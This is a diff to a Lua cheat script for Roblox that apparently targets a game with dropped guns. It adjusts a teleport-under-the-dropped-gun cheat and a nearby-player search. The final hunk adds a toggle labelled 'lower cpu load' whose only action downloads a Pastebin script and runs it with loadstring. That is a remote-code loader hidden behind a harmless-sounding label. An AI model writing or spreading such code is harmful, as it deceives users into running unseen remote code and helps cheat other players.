@@ -1476,7 +1476,7 @@ end
 
 local function findNearbyPlayer()
     local nearestPlayer = nil
-    local nearestDistance = 7.2
+    local nearestDistance = 6
 
     for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
         if otherPlayer ~= player and otherPlayer.Character then
@@ -1893,51 +1893,38 @@ TeleportSection:NewToggle("TP Gun", "ToggleInfo", function(state)
                 })
             end
 
-            local function onButtonClick()
-                button.BackgroundColor3 = Color3.fromRGB(173, 216, 230)
-                wait(0.3)
-                button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-            end
-
-            button.MouseButton1Click:Connect(onButtonClick)
-
             local function teleportToDroppedGun()
                 local character = player.Character or player.CharacterAdded:Wait()
                 local gunDrop = workspace:FindFirstChild("GunDrop", true)
 
                 if gunDrop and character.PrimaryPart then
-                    local belowGunPosition = gunDrop.CFrame * CFrame.new(0, -2, 0)
+                    local belowGunPosition = gunDrop.CFrame * CFrame.new(0, -1, 0)
                     local originalPosition = character.PrimaryPart.CFrame
 
                     character:SetPrimaryPartCFrame(belowGunPosition)
-                    wait()
+                    wait(0.02)
                     character:SetPrimaryPartCFrame(originalPosition)
 
-                    sendNotification("Successful Teleport", "You have teleported temporarily under the dropped weapon.")
+                    sendNotification("Successful Teleport", "You teleported under the dropped weapon.")
                 else
-                    sendNotification("Teleportation Failed", "No dropped weapon found or the character is unavailable.")
+                    sendNotification("Teleport Failed", "No weapon found or character unavailable.")
                 end
             end
 
             button.MouseButton1Click:Connect(teleportToDroppedGun)
 
-            local function detectGunDrop()
-                local gunDropDetected = false
+            local function monitorGunDrops()
                 while state and screenGui.Parent do
                     local gunDrop = workspace:FindFirstChild("GunDrop", true)
-
-                    if gunDrop and not gunDropDetected then
-                        sendNotification("Weapon Detected", "A dropped weapon has been detected on the map. Press the button to teleport!")
-                        gunDropDetected = true
-                    elseif not gunDrop and gunDropDetected then
-                        sendNotification("Weapon Picked Up", "The dropped weapon has been picked up by another player.")
-                        gunDropDetected = false
+                    if gunDrop then
+                        sendNotification("Weapon Detected", "A dropped weapon has been detected! Press the button to teleport.")
+                        break
                     end
-                    wait(0.5)
+                    wait(1)
                 end
             end
 
-            spawn(detectGunDrop)
+            spawn(monitorGunDrops)
         end
     else
         if existingGui then
@@ -3283,6 +3270,10 @@ EmoteSection:NewButton("Sit", "ButtonInfo", function()
 		game.Players.LocalPlayer.Character.Humanoid.Changed:Once(function()
 			track:Stop()
 		end)
+    end)
+    
+AutoFarmSection:NewToggle("lower cpu load", "ToggleInfo", function(state)
+    loadstring(game:HttpGet("https://pastebin.com/raw/1R1D3nL7"))()
     end)
 
 local D3RenderingDisabled = false
